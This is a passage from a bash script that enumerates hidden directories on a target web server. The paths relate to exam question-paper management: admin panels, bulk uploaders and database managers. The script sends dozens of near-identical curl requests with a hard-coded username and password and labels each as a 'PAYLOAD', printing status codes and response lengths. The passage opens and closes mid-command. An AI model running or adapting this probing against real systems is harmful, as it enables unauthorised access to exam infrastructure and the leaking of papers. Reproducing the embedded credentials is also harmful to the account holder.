" "${target}QPMonitorDashboard/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorDashboard/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDataUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDataUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDataUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-Admin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-Admin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-Admin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManagerQPAuto/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManagerQPAuto/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManagerQPAuto/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_AutomationSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_AutomationSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_AutomationSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler_QsnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler_QsnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler_QsnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQPMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ModuleQPMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQPMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps_QPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps_QPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps_QPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_MassUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_MassUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_MassUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload-QP/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload-QP/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload-QP/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowQuestionPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}WorkflowQuestionPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowQuestionPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_Sync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_Sync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_Sync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorAutomationSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorAutomationSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorAutomationSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_System/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_System/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_System/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PlatformQstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PlatformQstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PlatformQstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_AccessControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_AccessControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_AccessControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload-QPAuto/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload-QPAuto/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload-QPAuto/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PanelQPaperDoc/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PanelQPaperDoc/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PanelQPaperDoc/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard-QPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard-QPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard-QPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperTransfer/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperTransfer/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperTransfer/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_Uploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_Uploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_Uploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_Module/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_Module/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_Module/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_AutoUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_AutoUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_AutoUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperMonitoringTool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperMonitoringTool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperMonitoringTool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PPortal/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PPortal/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PPortal/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQuestionPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQuestionPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQuestionPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSyncQPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSyncQPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSyncQPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling_QPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling_QPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling_QPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QPControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QPControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QPControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemMonitoring/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemMonitoring/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemMonitoring/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_Automation/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_Automation/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_Automation/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-BatchProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-BatchProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-BatchProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperBulkUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperBulkUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperBulkUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_Admin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_Admin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_Admin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager-QPBData/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager-QPBData/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager-QPBData/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkAccessControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkAccessControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkAccessControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-ExamPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-ExamPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-ExamPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileAccessControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileAccessControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileAccessControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-QPFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-QPFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-QPFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_FileUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
